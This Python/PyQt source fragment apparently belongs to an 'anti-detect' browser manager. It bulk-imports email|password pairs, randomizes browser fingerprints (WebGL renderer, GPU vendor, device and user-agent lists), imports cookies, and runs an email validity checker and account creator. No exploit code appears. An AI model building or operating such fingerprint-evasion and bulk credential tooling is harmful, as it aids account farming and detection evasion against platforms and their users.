		self.uiAddEmails.pushButtonAddEmailCancel.clicked.connect(self.cancel_account_setup)

	def cancel_account_setup(self):
		self.main.addEmailsSetupUi.hide()
  
	
	def handle_add_account(self):
		print('===handle_add_account==')
		self.plainTextEditAddBulkAccounts = self.uiAddEmails.plainTextEditAddEmails.toPlainText()
		data_put = {}
		if self.plainTextEditAddBulkAccounts.find('|') != -1:
			print('==add bulk account==')
			# mun_broser = mybrowser.MunAntiBrowser()
			list_emails = []
			for line_planText in self.plainTextEditAddBulkAccounts.split('\n'):
				if line_planText.find('|') != -1:
					account_infos = line_planText.strip().split('|')
					email = account_infos[0]
					password = account_infos[1]
					email_dict = {'email':email, 'password':password}
					if email_dict not in list_emails:
						list_emails.append(email_dict)					
					# time.sleep(0.1)
			if len(list_emails) > 1000:
				QtWidgets.QMessageBox.about(self, "Error", "You cannot add more than 1000 lines!")
			else:
				print(list_emails)
				data_put['action'] = 'add_accounts_emails'
				data_put['data'] = list_emails
				self.main.antiDetectQueque.put(data_put)
				self.uiAddEmails.plainTextEditAddEmails.setPlainText('')

class AddAccountsetup(QtWidgets.QDialog):
	def __init__(self, parent=None):
		QtWidgets.QDialog.__init__(self, parent)
		self.main = parent

		# uic.loadUi('ui/sshsetup.ui', self)
		self.uiAccount = addaccount.Ui_Dialog()
		self.uiAccount.setupUi(self)
		self.uiAccount.pushButtonAddaccount.clicked.connect(self.handle_add_account)
		self.uiAccount.pushButtoncancel.clicked.connect(self.cancel_account_setup)

	def cancel_account_setup(self):
		self.main.accountSetupUi.hide()
	def handle_add_account(self):
		print('===handle_add_account==')
		self.get_info_addaccount()
		self.add_account_and_profile()
  
	def get_info_addaccount(self):
		self.comboBoxAddType = self.uiAccount.comboBoxAddType.currentText()
		self.comboBoxAddaccountsOS = self.uiAccount.comboBoxAddaccountsOS.currentIndex()
		self.comboBoxAddAccountDevices = self.uiAccount.comboBoxAddAccountDevices.currentText()
		self.lineEditAddNameProfile = self.uiAccount.lineEditAddNameProfile.text()
		self.lineEditAddEmail = self.uiAccount.lineEditAddEmail.text()
		self.lineEditAddPassword = self.uiAccount.lineEditAddPassword.text()
		self.plainTextEditAddBulkAccounts = self.uiAccount.plainTextEditAddBulkAccounts.toPlainText()
		self.lineEditAddAccountProfileId = self.uiAccount.lineEditAddAccountProfileId.text()
		# print(comboBoxAddType, lineEditAddNameProfile, lineEditAddEmail, lineEditAddPassword, plainTextEditAddBulkAccounts)
	def add_account_and_profile(self):
		data_put = {}
		if self.plainTextEditAddBulkAccounts.find('|') != -1:
			print('==add bulk account==')
			# mun_broser = mybrowser.MunAntiBrowser()
			for line_planText in self.plainTextEditAddBulkAccounts.split('\n'):
				if line_planText.find('|') != -1:
					account_infos = line_planText.split('|')
					email = account_infos[0]
					password = account_infos[1]
					self.main.random_profile_setting(self.comboBoxAddaccountsOS, self.comboBoxAddAccountDevices)
					profilesBrowser = self.main.getCreateProfile()
					data_put['action'] = 'add_account'
					data_put['profile_browser'] = profilesBrowser
					data_put['profile_id'] = ''
					data_put['profile_name'] = email.replace('@','')
					data_put['account'] = {'email':email, 'password':password, 'type': self.comboBoxAddType}
					self.main.antiDetectQueque.put(data_put)
					time.sleep(0.1)
			self.uiAccount.plainTextEditAddBulkAccounts.setPlainText('')
			
		else:
			print('==add account==')
			if not self.lineEditAddNameProfile.strip():
				QtWidgets.QMessageBox.about(self, "Error", "Please add the name profile!")

			
			if not self.lineEditAddAccountProfileId.strip():
				self.main.random_profile_setting(self.comboBoxAddaccountsOS, self.comboBoxAddAccountDevices)
				profilesBrowser = self.main.getCreateProfile()
			else:
				if not self.lineEditAddAccountProfileId.strip().isnumeric():
					QtWidgets.QMessageBox.about(self, "Error", "the profile id must be numeric!")
					return
				profilesBrowser = {}
			data_put['action'] = 'add_account'
			data_put['profile_browser'] = profilesBrowser
			data_put['profile_id'] = self.lineEditAddAccountProfileId.strip()
			data_put['profile_name'] = self.lineEditAddNameProfile.strip()
			data_put['account'] = {'email':self.lineEditAddEmail, 'password':self.lineEditAddPassword, 'type': self.comboBoxAddType}
			self.main.antiDetectQueque.put(data_put)

class ProfileAddAccountsetup(QtWidgets.QDialog):
	def __init__(self, parent=None, profileID=None):
		QtWidgets.QDialog.__init__(self, parent)
		self.main = parent

		# uic.loadUi('ui/sshsetup.ui', self)
		self.uiProfileAccount = profileaddaccount.Ui_Dialog()

		self.uiProfileAccount.setupUi(self)
		if profileID:
			self.uiProfileAccount.lineEditProfileAddAccountID.setText(str(profileID))
		self.uiProfileAccount.pushButtonProfileAddAccountcancel.clicked.connect(self.cancel_account_setup)
		self.uiProfileAccount.pushButtonProfileAddaccount.clicked.connect(self.handle_add_account)
  
	def cancel_account_setup(self):
		self.main.profileAddAccountSetupUi.hide()
  
	def handle_add_account(self):
		print('===handle_add_account==')
		self.get_info_addaccount()
		self.add_account_and_profile()
  
	def get_info_addaccount(self):
		self.comboBoxProfileAddAccountType = self.uiProfileAccount.comboBoxProfileAddAccountType.currentText()
		self.lineEditProfileAddAccountID = self.uiProfileAccount.lineEditProfileAddAccountID.text()
		self.lineEditProfileAddAccountEmail = self.uiProfileAccount.lineEditProfileAddAccountEmail.text()
		self.lineEditProfileAddAccountPassword = self.uiProfileAccount.lineEditProfileAddAccountPassword.text()
		self.plainTextEditProfileAddAccountNote = self.uiProfileAccount.plainTextEditProfileAddAccountNote.toPlainText()

		# print(comboBoxAddType, lineEditAddNameProfile, lineEditAddEmail, lineEditAddPassword, plainTextEditAddBulkAccounts)
	def add_account_and_profile(self):
		data_put = {}
		data_put['action'] = 'add_account'
		data_put['profile_id'] = self.lineEditProfileAddAccountID.strip()
		data_put['account'] = {'email':self.lineEditProfileAddAccountEmail.strip(), 'password':self.lineEditProfileAddAccountPassword, 'type': self.comboBoxProfileAddAccountType, 'note':self.plainTextEditProfileAddAccountNote.strip()}
		self.main.antiDetectQueque.put(data_put)
  
class EmailSignupListSetup(QtWidgets.QDialog):
	def __init__(self, parent=None, profileID=None):
		QtWidgets.QDialog.__init__(self, parent)
		self.main = parent
  

		# uic.loadUi('ui/sshsetup.ui', self)
		self.uiEmailSignupList = emailsinguplist.Ui_DialogEmailSignupList()
		width, height = 1440, 900;
		screenRect = QtWidgets.QDesktopWidget().availableGeometry();
		x, y = (
			(screenRect.width() - screenRect.x() - width) / 2, (screenRect.height() - screenRect.y() - height) / 2);
		# self.setGeometry(int(x), int(y), width, height);
		
		self.uiEmailSignupList.setupUi(self)
		self.resize(width, height)
		self.uiEmailSignupList.pushButtonEmailSignupListSpecificList.clicked.connect(self.handle_create_specific_list)

		self.uiEmailSignupList.pushButtonEmailSignupListBlackList.clicked.connect(self.handle_create_specific_list)
  
		self.uiEmailSignupList.pushButtonEmailSignupListRefresh.clicked.connect(self.handle_refresh)

		self.uiEmailSignupList.pushButtonEmailSignupListFind.clicked.connect(self.handle_find)
		
	def handle_find(self):
		print('==handle_find==')
		self.main.findSignupEmails()

	def handle_create_specific_list(self):
		print('===handle_create_specific_list==', len(self.main.listSignupEmailsChecked))
		
  
	def handle_create_black_list(self):
		print('===handle_create_black_list==', len(self.main.listSignupEmailsChecked))
  
	def handle_refresh(self):
		print('===handle_refresh==')
		email_type = self.uiEmailSignupList.comboBoxEmailSignupListType.currentText()
		self.main.show_all_signup_email(email_type)
	
class AntiDectectMain(QtWidgets.QWidget):
	def __init__(self, mainWindow):
		super(AntiDectectMain, self).__init__();
		# variable
		self.mun_api = munantiapi.MunAntiApi()
		self.mainWindow = mainWindow
		# self.setingData = setingData
		self.antiDetectQueque = multiprocessing.Queue()
		self.statusqueue = multiprocessing.Queue()
		self.list_browsers = {}
		self.list_emails_running = {'emails':0}
		self.totalAntiDetectQueue = 0
		self.limitThreading = 20
		self.statustheard = None
		self.lastFilePath = ""

		self.ui = Ui_Antidectect()
		self.ui.setupUi(self)
		THIS_FOLDER = os.getcwd();
		profile_name = self.ui.lineEditProfileName.text()
		chrome_data_path = os.path.join(appFolderPath, 'chrome data/'+profile_name)
		self.ui.lineEditProfilePath.setText(chrome_data_path)
  
		self.list_iPhone_resolution = {'iPhone 14 Pro Max':{'resolution':'430x932','scale':'3'},'iPhone 14 Pro':{'resolution':'393x852','scale':'3'}, 'iPhone 14 Plus':{'resolution':'428x926','scale':'3'},'iPhone 14':{'resolution':'390x844','scale':'3'},'iPhone SE 3rd gen':{'resolution':'375x667','scale':'2'},'iPhone 13':{'resolution':'390x844','scale':'3'}, 'iPhone 13 mini':{'resolution':'375x812','scale':'3'},'iPhone 13 Pro Max':{'resolution':'428x926','scale':'3'}, 'iPhone 13 Pro':{'resolution':'390x844','scale':'3'}, 'iPhone 12':{'resolution':'390x844','scale':'3'},'iPhone 12 mini':{'resolution':'375x812','scale':'3'}, 'iPhone 12 Pro Max':{'resolution':'428x926','scale':'3'}, 'iPhone 12 Pro': {'resolution':'390x844','scale':'3'}, 'iPhone SE 2nd gen':{'resolution':'375x667','scale':'2'}, 'iPhone 11 Pro Max':{'resolution':'414x896','scale':'3'}, 'iPhone 11 Pro':{'resolution':'375x812','scale':'3'}, 'iPhone 11':{'resolution':'414x896','scale':'2'}, 'iPhone XR':{'resolution':'414x896','scale':'2'}, 'iPhone XS Max':{'resolution':'414x896','scale':'3'}, 'iPhone XS':{'resolution':'375x812','scale':'3'}, 'iPhone X':{'resolution':'375x812','scale':'3'}}
		self.list_apple_ios = ['16_1','15_7','14_8', '13_7']
		self.list_android_resolution = {'Samsung Galaxy Z Flip 4':{'resolution':'412 x 1004','scale':'3', 'model':'SM-F721B'},'Samsung Galaxy S9+': {'resolution':'360 x 740','scale':'3', 'model':'SM-G965F'}, 'Samsung Galaxy S9': {'resolution':'360 x 740','scale':'3', 'model':'SM-G960U'}, 'Samsung Galaxy S8+': {'resolution':'360 x 740','scale':'3' , 'model':'SM-G955F'}, 'Samsung Galaxy S8': {'resolution':'360 x 740','scale':'3', 'model':'SM-G950F'}, 'Nexus 6P': {'resolution':'412 x 732','scale':'3', 'model':'Nexus 6P'}, 'Nexus 5X': {'resolution':'412 x 732','scale':'3', 'model':'Nexus 5X'}, 'Google Pixel 4 XL': {'resolution':'412 x 869','scale':'3', 'model': 'Pixel 4 XL'}, 'Google Pixel 4': {'resolution':'412 x 869','scale':'3', 'model': 'Pixel 4'} }
		self.list_android_os = ['9', '10', '11', '12', '13']
  
		self.list_renderer = ['ANGLE (NVIDIA Quadro 2000M Direct3D11 vs_5_0 ps_5_0)','ANGLE (NVIDIA Quadro K420 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (NVIDIA Quadro 2000M Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (NVIDIA Quadro K2000M Direct3D11 vs_5_0 ps_5_0)','ANGLE (Intel(R) HD Graphics Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) HD Graphics Family Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (ATI Radeon HD 3800 Series Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) HD Graphics 4000 Direct3D11 vs_5_0 ps_5_0)','ANGLE (Intel(R) HD Graphics 4000 Direct3D11 vs_5_0 ps_5_0)','ANGLE (AMD Radeon R9 200 Series Direct3D11 vs_5_0 ps_5_0)','ANGLE (Intel(R) HD Graphics Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) HD Graphics Family Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) HD Graphics Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) HD Graphics Family Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) HD Graphics 4000 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) HD Graphics 3000 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Mobile Intel(R) 4 Series Express Chipset Family Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) G33/G31 Express Chipset Family Direct3D9Ex vs_0_0 ps_2_0)','ANGLE (Intel(R) Graphics Media Accelerator 3150 Direct3D9Ex vs_0_0 ps_2_0)','ANGLE (Intel(R) G41 Express Chipset Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (NVIDIA GeForce 6150SE nForce 430 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) HD Graphics 4000)','ANGLE (Mobile Intel(R) 965 Express Chipset Family Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) HD Graphics Family)','ANGLE (NVIDIA GeForce GTX 760 Direct3D11 vs_5_0 ps_5_0)','ANGLE (NVIDIA GeForce GTX 760 Direct3D11 vs_5_0 ps_5_0)','ANGLE (NVIDIA GeForce GTX 760 Direct3D11 vs_5_0 ps_5_0)','ANGLE (AMD Radeon HD 6310 Graphics Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) Graphics Media Accelerator 3600 Series Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) G33/G31 Express Chipset Family Direct3D9 vs_0_0 ps_2_0)','ANGLE (AMD Radeon HD 6320 Graphics Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) G33/G31 Express Chipset Family (Microsoft Corporation - WDDM 1.0) Direct3D9Ex vs_0_0 ps_2_0)','ANGLE (Intel(R) G41 Express Chipset)','ANGLE (ATI Mobility Radeon HD 5470 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) Q45/Q43 Express Chipset Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (NVIDIA GeForce 310M Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) G41 Express Chipset Direct3D9 vs_3_0 ps_3_0)','ANGLE (Mobile Intel(R) 45 Express Chipset Family (Microsoft Corporation - WDDM 1.1) Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (NVIDIA GeForce GT 440 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (ATI Radeon HD 4300/4500 Series Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (AMD Radeon HD 7310 Graphics Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) HD Graphics)','ANGLE (Intel(R) 4 Series Internal Chipset Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (AMD Radeon(TM) HD 6480G Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (ATI Radeon HD 3200 Graphics Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (AMD Radeon HD 7800 Series Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) G41 Express Chipset (Microsoft Corporation - WDDM 1.1) Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (NVIDIA GeForce 210 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (NVIDIA GeForce GT 630 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (AMD Radeon HD 7340 Graphics Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) 82945G Express Chipset Family Direct3D9 vs_0_0 ps_2_0)','ANGLE (NVIDIA GeForce GT 430 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (NVIDIA GeForce 7025 / NVIDIA nForce 630a Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) Q35 Express Chipset Family Direct3D9Ex vs_0_0 ps_2_0)','ANGLE (Intel(R) HD Graphics 4600 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (AMD Radeon HD 7520G Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (AMD 760G (Microsoft Corporation WDDM 1.1) Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (NVIDIA GeForce GT 220 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (NVIDIA GeForce 9500 GT Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) HD Graphics Family Direct3D9 vs_3_0 ps_3_0)','ANGLE (Intel(R) Graphics Media Accelerator HD Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (NVIDIA GeForce 9800 GT Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) Q965/Q963 Express Chipset Family (Microsoft Corporation - WDDM 1.0) Direct3D9Ex vs_0_0 ps_2_0)','ANGLE (NVIDIA GeForce GTX 550 Ti Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) Q965/Q963 Express Chipset Family Direct3D9Ex vs_0_0 ps_2_0)','ANGLE (AMD M880G with ATI Mobility Radeon HD 4250 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (NVIDIA GeForce GTX 650 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (ATI Mobility Radeon HD 5650 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (ATI Radeon HD 4200 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (AMD Radeon HD 7700 Series Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) G33/G31 Express Chipset Family)','ANGLE (Intel(R) 82945G Express Chipset Family Direct3D9Ex vs_0_0 ps_2_0)','ANGLE (SiS Mirage 3 Graphics Direct3D9Ex vs_2_0 ps_2_0)','ANGLE (NVIDIA GeForce GT 430)','ANGLE (AMD RADEON HD 6450 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (ATI Radeon 3000 Graphics Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) 4 Series Internal Chipset Direct3D9 vs_3_0 ps_3_0)','ANGLE (Intel(R) Q35 Express Chipset Family (Microsoft Corporation - WDDM 1.0) Direct3D9Ex vs_0_0 ps_2_0)','ANGLE (NVIDIA GeForce GT 220 Direct3D9 vs_3_0 ps_3_0)','ANGLE (AMD Radeon HD 7640G Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (AMD 760G Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (AMD Radeon HD 6450 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (NVIDIA GeForce GT 640 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (NVIDIA GeForce 9200 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (NVIDIA GeForce GT 610 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (AMD Radeon HD 6290 Graphics Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (ATI Mobility Radeon HD 4250 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (NVIDIA GeForce 8600 GT Direct3D9 vs_3_0 ps_3_0)','ANGLE (ATI Radeon HD 5570 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (AMD Radeon HD 6800 Series Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) G45/G43 Express Chipset Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (ATI Radeon HD 4600 Series Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (NVIDIA Quadro NVS 160M Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) HD Graphics 3000)','ANGLE (NVIDIA GeForce G100)','ANGLE (AMD Radeon HD 8610G + 8500M Dual Graphics Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Mobile Intel(R) 4 Series Express Chipset Family Direct3D9 vs_3_0 ps_3_0)','ANGLE (NVIDIA GeForce 7025 / NVIDIA nForce 630a (Microsoft Corporation - WDDM) Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) Q965/Q963 Express Chipset Family Direct3D9 vs_0_0 ps_2_0)','ANGLE (AMD RADEON HD 6350 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (ATI Radeon HD 5450 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (NVIDIA GeForce 9500 GT)','ANGLE (AMD Radeon HD 6500M/5600/5700 Series Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Mobile Intel(R) 965 Express Chipset Family)','ANGLE (NVIDIA GeForce 8400 GS Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (Intel(R) HD Graphics Direct3D9 vs_3_0 ps_3_0)','ANGLE (NVIDIA GeForce GTX 560 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (NVIDIA GeForce GT 620 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (NVIDIA GeForce GTX 660 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (AMD Radeon(TM) HD 6520G Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (NVIDIA GeForce GT 240 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (AMD Radeon HD 8240 Direct3D9Ex vs_3_0 ps_3_0)','ANGLE (NVIDIA Quadro NVS 140M)','ANGLE (Intel(R) Q35 Express Chipset Family Direct3D9 vs_0_0 ps_2_0)']
		self.list_gpu_vendor = ["Google Inc. (ATI Technologies Inc.)"]
		self.list_es = ["WebGL 2.0 (OpenGL ES 3.0 Chromium)"]
		self.list_glsl = ["WebGL GLSL ES (OpenGL Chromium)","WebGL GLSL ES 3.00 (OpenGL ES GLSL ES 3.0 Chromium)"]
		self.list_cpu = ["2","4","6","8","10"]
		self.list_screen_resolution = ['1920x1200','1920x1080','1536x864','1440x900','1366x768','1280x720']
		self.list_chrome_version = ["107.0.0.0","107.0.5304.88","107.0.5304.66", "106.0.5249.91","105.0.5195.125","105.0.0.0","105.0.5195.136","104.0.5112.79","104.0.0.0"]
  
  
		screen = QApplication.primaryScreen()
		size = screen.size()
		print('Size: %d x %d' % (size.width(), size.height()))
		rect = screen.availableGeometry()
		print('Available: %d x %d' % (rect.width(), rect.height()))
  

		
		#render
		self.ui.comboBoxRenderer.addItems(self.list_renderer)
		self.ui.comboBoxRenderer.setCurrentIndex(random.randint(0, self.ui.comboBoxRenderer.count()-1))
		#vendor
		self.ui.comboBoxVendor.addItems(self.list_gpu_vendor)
		self.ui.comboBoxVendor.setCurrentIndex(random.randint(0, self.ui.comboBoxVendor.count()-1))  
		#cpu 
		self.ui.comboBoxCpu.addItems(self.list_cpu)
		self.ui.comboBoxCpu.setCurrentIndex(random.randint(0, self.ui.comboBoxCpu.count()-1))
		#resolution
		self.ui.comboBoxResoluton.addItems(self.list_screen_resolution)
		self.ui.comboBoxResoluton.setCurrentIndex(random.randint(0, self.ui.comboBoxResoluton.count()-1))  
  
		#comboBoxVersion
		self.ui.comboBoxVersion.addItems(self.list_chrome_version)
		self.ui.comboBoxVersion.setCurrentIndex(random.randint(0, self.ui.comboBoxVersion.count()-1))    
  
		#comboPhoneOS
		self.list_phone_os = list(self.list_iPhone_resolution.keys()) + list(self.list_android_resolution.keys())
		self.ui.comboBoxPhoneOS.addItems(self.list_phone_os)
		self.ui.comboBoxPhoneOS.setCurrentIndex(random.randint(0, self.ui.comboBoxPhoneOS.count()-1))  
  
		comboBoxDevices = self.ui.comboBoxDevices.currentText()
		self.set_user_agent(comboBoxDevices)
  
		# self.ui.tableWidgetProfiles.verticalHeader().setVisible(False)
		# self.ui.tableWidgetProfiles.setSortingEnabled(True)

		#accounts
		self.listAccountsChecked = []
		self.all_accounts = []
		labelsAccounts = ['All']
		for c in range(self.ui.tableWidgetAccounts.columnCount()):
			it = self.ui.tableWidgetAccounts.horizontalHeaderItem(c)
			labelsAccounts.append(str(c+1) if it is None else it.text())
		self.ui.tableWidgetAccounts.setColumnCount(len(labelsAccounts))
		self.headerAccounts = CheckBoxHeader()
		self.ui.tableWidgetAccounts.setHorizontalHeader(self.headerAccounts)
		self.ui.tableWidgetAccounts.setHorizontalHeaderLabels(
			labelsAccounts)
		self.headerAccounts.select_all_clicked.connect(
			self.headerAccounts.change_state)
		# self.setTableHeaderField(self.ui.tableWidgetAccounts, labelsAccounts)
  
		#profiles
		self.listProfilesChecked = []
		self.all_profiles = []
		labelsProfiles = ['All']
		for c in range(self.ui.tableWidgetProfiles.columnCount()):
			it = self.ui.tableWidgetProfiles.horizontalHeaderItem(c)
			labelsProfiles.append(str(c+1) if it is None else it.text())
		self.ui.tableWidgetProfiles.setColumnCount(len(labelsProfiles))
		self.headerProfiles = CheckBoxHeader()
		self.ui.tableWidgetProfiles.setHorizontalHeader(self.headerProfiles)
		self.ui.tableWidgetProfiles.setHorizontalHeaderLabels(
			labelsProfiles)
		self.headerProfiles.select_all_clicked.connect(
			self.headerProfiles.change_state)
		# self.ui.tableWidgetProfiles.setSelectionMode(
		# 	QAbstractItemView.MultiSelection)
  
		#checker
		self.total_check_list = 0
		self.total_checked = 0
		self.total_unkown = 0
		self.total_invalid = 0
		self.total_valid = 0
  
  
  
		self.email_connected = None
		self.current_list_emails = []
		self.current_list_signup_emails = []
		self.current_list_accounts = []
		self.current_list_profiles = []
		#emails
		self.listEmailsChecked = []

		self.listSignupEmailsChecked = []
  
		labelsEmails = ['All']
		for c in range(self.ui.tableWidgetEmails.columnCount()):
			it = self.ui.tableWidgetEmails.horizontalHeaderItem(c)
			labelsEmails.append(str(c+1) if it is None else it.text())
		self.ui.tableWidgetEmails.setColumnCount(len(labelsEmails))
		self.headerEmails = CheckBoxHeader()
		self.ui.tableWidgetEmails.setHorizontalHeader(self.headerEmails)
		self.ui.tableWidgetEmails.setHorizontalHeaderLabels(
			labelsEmails)
		self.headerEmails.select_all_clicked.connect(
			self.headerEmails.change_state)

		#Creator
		labelsSignupEmails = ['All']
		for c in range(self.ui.tableWidgetCreatorStatus.columnCount()):
			it = self.ui.tableWidgetCreatorStatus.horizontalHeaderItem(c)
			labelsSignupEmails.append(str(c+1) if it is None else it.text())
		self.ui.tableWidgetCreatorStatus.setColumnCount(len(labelsSignupEmails))
		self.headerSignupEmails = CheckBoxHeader()
		self.ui.tableWidgetCreatorStatus.setHorizontalHeader(self.headerSignupEmails)
		self.ui.tableWidgetCreatorStatus.setHorizontalHeaderLabels(
			labelsSignupEmails)
		self.headerSignupEmails.select_all_clicked.connect(
			self.headerSignupEmails.change_state)
  
  
		#subjects
		# self.listEmailsChecked = []

		# labelsEmailSubjects = ['All']
		# for c in range(self.ui.tableWidgetEmailSubjects.columnCount()):
		# 	it = self.ui.tableWidgetEmailSubjects.horizontalHeaderItem(c)
		# 	labelsEmailSubjects.append(str(c+1) if it is None else it.text())
		# self.ui.tableWidgetEmailSubjects.setColumnCount(len(labelsEmailSubjects))
		# self.headerEmailSubjects = CheckBoxHeader()
		# self.ui.tableWidgetEmailSubjects.setHorizontalHeader(self.headerEmailSubjects)
		# self.ui.tableWidgetEmailSubjects.setHorizontalHeaderLabels(
		# 	labelsEmailSubjects)
		# self.headerEmailSubjects.select_all_clicked.connect(
		# 	self.headerEmailSubjects.change_state)
		self.ui.tableWidgetEmailSubjects.setMaximumHeight(300)
		# self.ui.tableWidgetEmails.setMaximumWidth(350)
		# self.ui.comboBoxFindEmails.setMaximumWidth(350)
  
  
		# table setting
		self.ui.tableWidgetProfiles.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectRows)
		self.ui.tableWidgetAccounts.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectRows)
		self.ui.tableWidgetEmails.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectRows)
		self.ui.tableWidgetEmailSubjects.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectRows)

		# self.ui.tableWidgetEmailSubjects.horizontalHeader().setStretchLastSection(True )
		# show
		self.show();
		
		# connect
		# self.ui.pushButtonCreateAccount.clicked.connect(self.startCreateAccount)		
  
		self.ui.pushButtonViewAccount.clicked.connect(self.startViewAccount)
  
		self.ui.pushButtonCreateProfile.clicked.connect(self.startCreateProfile)

		self.ui.pushButtonRandomProfile.clicked.connect(self.random_profile_setting)
		
		self.ui.pushButtonRefesh.clicked.connect(self.show_all_profiles)

		self.ui.tableWidgetProfiles.itemChanged.connect(self.save_profiles_changes)
		
		self.ui.tableWidgetAccounts.itemChanged.connect(self.save_accounts_changes)
  
		self.ui.comboBoxOS.currentTextChanged.connect(self.on_comboboxOS_changed)
	
		self.ui.comboBoxDevices.currentTextChanged.connect(self.on_comboBoxDevices_changed)
  
		self.ui.comboBoxVersion.currentTextChanged.connect(self.on_comboboxOS_changed)
  
		self.ui.comboBoxPhoneOS.currentTextChanged.connect(self.on_comboboxOS_changed)
  
		self.ui.pushButtonRemove.clicked.connect(self.remove_profiles)
  
		self.ui.pushButtonRemoveAccount.clicked.connect(self.remove_accounts)
  
		self.ui.pushButtonAccountSetup.clicked.connect(self.add_account_setup)

		self.ui.pushButtonAddEmail.clicked.connect(self.add_emails_setup)
  
		self.ui.pushButtonRefeshAccounts.clicked.connect(self.show_all_accounts)

		self.ui.pushButtonSetAutoView.clicked.connect(self.set_auto_view)
		
		self.ui.pushButtonRemoveAutoView.clicked.connect(self.remove_auto_view)

		self.ui.pushButtonUpdateNewProfile.clicked.connect(self.accounts_update_new_profiles)

		self.ui.pushButtonProfileUpdateNewProfile.clicked.connect(self.profile_update_new_profiles)
		
		self.ui.tabWidgetMain.tabBarClicked.connect(self.onTabMiddleClick)
  
		self.ui.tableWidgetEmailSubjects.clicked.connect(self.showEmailBody)
		
		self.ui.pushButtonRefeshEmails.clicked.connect(self.refreshEmailSubjects)
  
		self.ui.pushButtonProfileAddaccounts.clicked.connect(self.showProfileAddAccounts)
  
		self.ui.pushButtonCreatorRun.clicked.connect(self.creator_run)
  
		self.ui.pushButtonImportCookies.clicked.connect(self.import_cookies_to_profile)

		self.ui.pushButtonFind.clicked.connect(self.findProfiles)
  
		self.ui.pushButtonFindAccounts.clicked.connect(self.findAccounts)

		self.ui.pushButtonFindEmails.clicked.connect(self.findEmails)
  
		self.ui.pushButtonRemoveEmails.clicked.connect(self.remove_emails)
  
		self.ui.pushButtonCreatorRefresh.clicked.connect(self.show_email_signup_list)
  
		self.ui.pushButtonCreatorSetBlackList.clicked.connect(self.set_black_list_emails)
  
		self.ui.listEmailButton.clicked.connect(self.checker_select_file)
  
		self.ui.savepushButton.clicked.connect(self.checker_save_file)

		self.ui.startButtonChecker.clicked.connect(self.start_checker)
